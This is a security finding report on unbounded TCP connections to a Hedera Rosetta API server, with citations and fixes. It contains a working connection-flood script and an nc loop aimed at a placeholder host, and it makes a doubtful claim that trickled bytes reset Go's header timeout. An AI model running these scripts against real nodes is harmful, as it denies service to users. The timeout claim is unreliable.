### Title
Unbounded TCP Connection Acceptance on Rosetta API Port 5700 Enables Port Exhaustion DoS

### Summary
The Rosetta API HTTP server in `rosetta/main.go` constructs a `net/http.Server` with no connection limit — no `netutil.LimitListener`, no `MaxConns` equivalent — meaning any unprivileged remote attacker can open an unbounded number of TCP connections to port 5700. The only protective layer (Traefik `inFlightReq`/`rateLimit` middleware) is disabled by default (`global.middleware: false`). An attacker can exhaust the process's file descriptors or OS connection table, causing all subsequent `/construction/submit` requests to be refused, blocking transaction gossip.

### Finding Description

**Exact code path:**

`rosetta/main.go` lines 220–227 construct the HTTP server:

```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

Go's `net/http.Server` has no built-in `MaxConns` field. The standard mitigation is to wrap the listener with `netutil.LimitListener` before passing it to `Serve()`. Here, `httpServer.ListenAndServe()` is called directly (line 231), which creates an unbounded listener internally. A grep across all rosetta Go source confirms zero usage of `LimitListener`, `MaxConns`, `netutil`, or any connection-counting semaphore.

**Root cause:** The `Config` struct (`rosetta/app/config/types.go` lines 19–33) exposes `Http` timeouts but no `MaxConnections` field, and `main.go` never wraps the listener with a connection cap.

**Why the only existing check is insufficient:**

The Traefik middleware chain (`inFlightReq: amount 5` per IP, `rateLimit: average 10/s`) defined in `charts/hedera-mirror-rosetta/values.yaml` lines 152–160 is gated by:

```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

(`charts/hedera-mirror-rosetta/templates/middleware.yaml` line 3)

`global.middleware` defaults to `false` (`values.yaml` line 95). The middleware is therefore **not deployed** in a default installation. Even when deployed, it sits in front of the Ingress/Gateway, not the raw port 5700 listener — direct access to port 5700 bypasses it entirely.

**Timeouts are insufficient:** `ReadHeaderTimeout` (default 3 s) closes idle connections, but an attacker sending one byte every 2.9 s keeps each connection alive indefinitely. With a typical Linux fd limit of 1024 (soft) or 65536 (hard), maintaining ~350 connections/second saturates the server permanently.

### Impact Explanation

When file descriptors are exhausted, `accept()` on the listening socket fails. All new TCP connections — including legitimate `/construction/submit` calls — are refused at the OS level. This completely blocks transaction gossip to the Hedera network for the duration of the attack. The impact is a full denial of the construction/submit flow, which is the primary purpose of an online Rosetta node.

### Likelihood Explanation

No authentication, no IP allowlist, and no connection cap are required to be bypassed. Any host with TCP reachability to port 5700 can execute this. The attack is trivially scriptable (`for i in $(seq 1 10000); do nc -w 300 <host> 5700 &; done`), requires no special tooling, and is repeatable indefinitely. In a default Kubernetes deployment without `global.middleware: true`, there is no rate-limiting layer between the internet and port 5700.

### Recommendation

1. **Immediate (application layer):** In `rosetta/main.go`, replace `httpServer.ListenAndServe()` with a `netutil.LimitListener`-wrapped listener:
   ```go
   ln, _ := net.Listen("tcp", fmt.Sprintf(":%d", rosettaConfig.Port))
   ln = netutil.LimitListener(ln, rosettaConfig.Http.MaxConnections)
   httpServer.Serve(ln)
   ```
   Add a `MaxConnections int` field to the `Http` struct in `rosetta/app/config/types.go` with a safe default (e.g., 1000).

2. **Configuration layer:** Set `global.middleware: true` as the default in `charts/hedera-mirror-rosetta/values.yaml` so the Traefik `inFlightReq` and `rateLimit` middleware is active by default.

3. **Network layer:** Restrict access to port 5700 via network policy or firewall to trusted sources only.

### Proof of Concept

**Preconditions:** Network access to port 5700 of a default-deployed Rosetta node (`global.middleware: false`).

**Steps:**
```bash
# 1. Open thousands of slow connections (send 1 byte every 2s to stay within ReadHeaderTimeout)
python3 -c "
import socket, time, threading

def hold(i):
    try:
        s = socket.socket()
        s.connect(('TARGET_HOST', 5700))
        while True:
            s.send(b'G')   # partial HTTP header, resets read timer
            time.sleep(2)
    except: pass

threads = [threading.Thread(target=hold, args=(i,)) for i in range(2000)]
[t.start() for t in threads]
[t.join() for t in threads]
"

# 2. In a separate terminal, attempt a legitimate construction/submit:
curl -X POST http://TARGET_HOST:5700/construction/submit \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},"signed_transaction":"..."}'
# Result: Connection refused or timeout — gossip blocked.
```

**Expected result:** Once fd limit is reached, all new connections including `/construction/submit` are refused at the OS level. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** rosetta/main.go (L220-227)
```go
	httpServer := &http.Server{
		Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
		Handler:           corsMiddleware,
		IdleTimeout:       rosettaConfig.Http.IdleTimeout,
		ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
		ReadTimeout:       rosettaConfig.Http.ReadTimeout,
		WriteTimeout:      rosettaConfig.Http.WriteTimeout,
	}
```

**File:** rosetta/main.go (L229-235)
```go
	go func() {
		log.Infof("Listening on port %d", rosettaConfig.Port)
		if err := httpServer.ListenAndServe(); err != nil {
			log.Errorf("Error http listen and serve: %v", err)
			stop()
		}
	}()
```

**File:** rosetta/app/config/types.go (L64-69)
```go
type Http struct {
	IdleTimeout       time.Duration `yaml:"idleTimeout"`
	ReadTimeout       time.Duration `yaml:"readTimeout"`
	ReadHeaderTimeout time.Duration `yaml:"readHeaderTimeout"`
	WriteTimeout      time.Duration `yaml:"writeTimeout"`
}
```

**File:** charts/hedera-mirror-rosetta/templates/middleware.yaml (L3-3)
```yaml
{{ if and .Values.global.middleware .Values.middleware -}}
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L88-96)
```yaml
global:
  config: {}
  env: {}
  gateway:
    enabled: false
    hostnames: []
  image: {}
  middleware: false
  namespaceOverride: ""
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L149-166)
```yaml
middleware:
  - circuitBreaker:
      expression: NetworkErrorRatio() > 0.25 || ResponseCodeRatio(500, 600, 0, 600) > 0.25
  - inFlightReq:
      amount: 5
      sourceCriterion:
        ipStrategy:
          depth: 1
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
      attempts: 3
      initialInterval: 100ms
  - stripPrefix:
      prefixes:
        - "/rosetta"
```
